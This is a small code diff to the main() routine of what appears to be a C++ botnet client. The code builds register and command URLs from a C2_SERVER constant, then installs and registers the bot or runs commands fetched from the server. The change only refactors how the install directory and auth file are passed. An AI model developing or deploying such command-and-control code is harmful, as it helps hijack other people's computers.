@@ -5,11 +5,10 @@
 #include "bot.hh"
 
 int main() {
-    std::string register_url, command_url, authfile_path, install_dir;
+    std::string register_url, command_url, install_dir;
 
     install_dir = util::GetInstallDir();
-    authfile_path = install_dir + AUTH_FILE;
-    Bot host(authfile_path);
+    Bot host(install_dir);
 
     register_url = C2_SERVER + REGISTER_URI;
     command_url = C2_SERVER + CMD_URI;
@@ -17,7 +16,7 @@ int main() {
     if (host.IsNew()) {
         host.ExecuteCommand(command_url);
     } else {
-        host.Install(install_dir);
+        host.Install();
         host.RegisterBot(register_url);
     }
 
